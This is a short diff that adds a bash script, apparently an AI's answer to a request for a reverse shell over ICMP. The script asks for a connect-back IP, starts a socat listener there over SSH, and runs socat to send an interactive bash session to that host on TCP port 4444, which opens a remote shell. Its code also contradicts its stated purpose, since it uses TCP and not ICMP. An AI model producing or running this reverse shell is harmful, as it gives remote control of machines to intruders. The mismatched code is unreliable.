@@ -1,0 +1,29 @@
+morb asked write a bash script that creates a reverse shell that uses icmp with hash 53f1b986
+<---- snip ---->
+#!/bin/bash
+
+# Create a reverse shell that uses icmp
+
+# Check if root
+if [ `id -u` -ne 0 ]; then 
+    echo "This script must be run as root"
+    exit 1
+fi
+
+# Check if socat is installed
+if [ ! -x "$(command -v socat)" ]; then
+    echo "Error: socat is not installed. Please install socat first!"
+    exit 1
+fi
+
+# Ask the user for an IP address to connect back to
+echo "Please enter the IP of the machine you wish to connect back to:"
+read IP
+
+# Set up a listener on the remote machine
+echo "Setting up a listener on the remote machine..."
+ssh root@$IP "socat file:`tty`,raw,echo=0 tcp-listen:4444"
+
+# Create the reverse shell
+echo "Creating the reverse shell..."
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444
